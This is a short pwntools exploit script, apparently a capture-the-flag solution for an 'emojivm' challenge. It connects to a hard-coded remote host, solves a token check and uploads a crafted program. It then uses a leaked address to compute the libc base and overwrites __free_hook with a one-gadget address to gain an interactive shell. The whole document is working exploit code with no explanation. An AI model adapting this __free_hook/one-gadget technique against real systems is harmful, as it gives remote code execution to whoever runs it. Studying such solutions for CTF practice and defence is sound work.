#!/usr/bin/env python
from pwn import *
import subprocess

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
libc = ELF('./libc.so.6')

#r = process(['./emojivm', 'pwn'])
r = remote('3.115.176.164', 30262)
inp = open('./pwn').read()
r.readline()
cmd = r.readline().strip().split(' ')
token = subprocess.check_output(cmd, stderr=subprocess.STDOUT).strip()
r.sendlineafter(' token: ', token)
r.sendlineafter('bytes ) ', str(len(inp)))
r.sendafter('file:\n', inp)


leak = int(r.recvn(14))
buf = leak - 0x6b0

r.send(p64(8) + p64(buf))
libc.address = u64(r.recvn(6)+'\x00\x00') - 0x3ebca0
print 'libc base:', hex(libc.address)

r.send(p64(8) + p64(libc.symbols['__free_hook']))
magic = libc.address + 0x4f322
r.send(p64(magic))

r.interactive()
